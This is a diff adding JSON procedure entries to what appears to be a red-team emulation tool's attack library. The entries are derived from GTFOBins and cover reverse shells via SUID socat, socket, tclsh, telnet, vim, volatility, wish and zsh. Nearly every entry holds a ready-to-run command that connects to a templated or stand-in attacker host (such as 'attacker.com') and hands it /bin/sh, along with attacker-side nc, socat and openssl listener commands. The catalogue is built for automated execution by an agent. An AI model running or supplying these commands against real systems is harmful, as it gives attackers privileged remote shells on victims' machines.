+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/socat",
+        "source_bin": "socat",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",
+          "shell": false
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server-tty"
+        },
+        "operator_notes": {
+          "listener": "tcp-server-tty"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:socat:reverse-shell:0:suid::",
+        "source_name": "socat",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `socat` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:socket:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - socket - Reverse shell - Suid [6c7b1cf]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: socket. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "socket -qvp '/bin/sh -i' #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/socket",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/socket",
+        "source_bin": "socket",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:socket:reverse-shell:0:suid::",
+        "source_name": "socket",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `socket` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tclsh:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - tclsh - Reverse shell - Suid [1403698]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: tclsh. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tclsh\nset s [socket #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port}];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tclsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tclsh",
+        "source_bin": "tclsh",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tclsh:reverse-shell:0:suid::",
+        "source_name": "tclsh",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `tclsh` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:telnet:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - telnet - Reverse shell - Suid [006cf6f]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: telnet. Context: SUID. The shell process is not spawn by `openssl`.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mkfifo /path/to/temp-socket\ntelnet #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port} </path/to/temp-socket | /bin/sh >/path/to/temp-socket",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/telnet",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/telnet",
+        "source_bin": "telnet",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:telnet:reverse-shell:0:suid::",
+        "source_name": "telnet",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `telnet` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:reverse-shell:0:suid:1:vim>lua",
+      "name": "GTFOBINS - T1059 - vim - Reverse shell - Suid [f0472ea]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: vim. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':lua ...'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "vim",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "vim",
+            "lua"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:reverse-shell:0:suid:1:vim>lua",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:reverse-shell:0:suid:0:vim>python",
+      "name": "GTFOBINS - T1059 - vim - Reverse shell - Suid [54b7ecd]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: vim. Context: SUID. This allows to run Python code (`...`). Inherits reverse-shell behavior from python.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':py ...'\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port}))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "vim",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          },
+          "tty": true,
+          "inherited_from": "python",
+          "inheritance_path": [
+            "vim",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          }
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:reverse-shell:0:suid:0:vim>python",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:volatility:reverse-shell:0:suid:0:volatility>python",
+      "name": "GTFOBINS - T1059 - volatility - Reverse shell - Suid [f62b49d]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: volatility. Context: SUID. Inherits reverse-shell behavior from python.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "volatility -f /path/to/core-dump volshell\n...\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port}))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/volatility",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/volatility",
+        "source_bin": "volatility",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "volatility",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          },
+          "tty": true,
+          "inherited_from": "python",
+          "inheritance_path": [
+            "volatility",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          }
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:volatility:reverse-shell:0:suid:0:volatility>python",
+        "source_name": "volatility",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `volatility` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:wish:reverse-shell:0:suid:0:wish>tclsh",
+      "name": "GTFOBINS - T1059 - wish - Reverse shell - Suid [1f10968]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: wish. Context: SUID. Inherits reverse-shell behavior from tclsh.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "wish\ntclsh\nset s [socket #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port}];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/wish",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/wish",
+        "source_bin": "wish",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "tclsh",
+        "inheritance_path": [
+          "wish",
+          "tclsh"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "tclsh",
+          "inheritance_path": [
+            "wish",
+            "tclsh"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:wish:reverse-shell:0:suid:0:wish>tclsh",
+        "source_name": "wish",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `wish` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:zsh:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - zsh - Reverse shell - Suid [9b89a52]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: zsh. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "zsh -c 'zmodload zsh/net/tcp;ztcp #{lotl_gtfobins_remote_host} #{lotl_gtfobins_remote_port};zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/zsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/zsh",
+        "source_bin": "zsh",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:zsh:reverse-shell:0:suid::",
+        "source_name": "zsh",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `zsh` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
